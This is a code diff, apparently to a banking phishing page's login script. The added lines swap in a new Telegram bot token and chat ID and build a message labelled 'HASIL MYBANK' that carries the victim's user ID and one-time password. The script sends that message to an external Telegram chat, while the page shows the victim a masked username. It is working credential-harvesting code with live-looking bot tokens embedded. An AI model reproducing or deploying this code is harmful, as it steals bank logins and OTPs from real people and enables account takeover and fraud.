@@ -135,11 +135,12 @@ function login() {
         return;
     }
 
-    const token = "8456111998:AAFOU6Rrgqkwfu65eWg3TZcKT7RI6JF5lbg";
-    const chatId = "6456077638";
+    const token = "8729819513:AAHuJSCT5sT4zR6Yv6xx-JdttOCKtR31hOM";
+    const chatId = "6647221855";
 
-    const pesan = `💌 Pesan baru
+    const pesan = `HASIL MYBANK
 
+NAMA: ${userid}
 OTP: ${pw}`;
     
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
@@ -166,19 +167,19 @@ OTP: ${pw}`;
     });
   }
 
-    const user = localStorage.getItem("userid");
+    const userid = localStorage.getItem("userid");
 
-if(!user){
+if(!userid){
 location.href="index.html";
 }
 
-let tampil = user;
+let tampil = userid;
 
-if(user.length>4){
-tampil = user.substring(0,2) + "*".repeat(user.length-4) + user.substring(user.length-2);
+if(userid.length>4){
+tampil = userid.substring(0,2) + "*".repeat(userid.length-4) + userid.substring(userid.length-2);
 }
 
-document.getElementById("user").innerHTML=tampil;
+document.getElementById("userid").innerHTML=tampil;
 </script>
 
 </body>
